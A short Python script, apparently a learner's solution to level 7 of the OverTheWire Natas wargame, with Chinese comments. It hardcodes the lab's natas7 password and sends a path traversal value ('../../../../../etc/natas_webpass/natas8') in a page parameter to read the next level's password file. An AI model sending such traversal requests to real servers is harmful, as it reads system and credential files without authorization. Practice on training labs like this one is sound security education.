#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests as req
import re

user = "natas7"
passwd = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

url = "http://%s.natas.labs.overthewire.org/" % user

# 使用 get method 時要加入的變數
params = {'page': '../../../../../etc/natas_webpass/natas8'}

# get method
response = req.get(url, auth=(user, passwd), params=params)
content = response.text

# with open("./Natas/response.html", mode='w', encoding='utf-8') as f:
#     print(content, file=f)

# . => 在 default 模式，匹配除了'\n'的任意字符。
# \* => 對它前面的 regular expression 匹配 0 到任意次重復。
answer = re.findall("<br>\n(.*)\n\n<!--", content)[0]
print(answer)
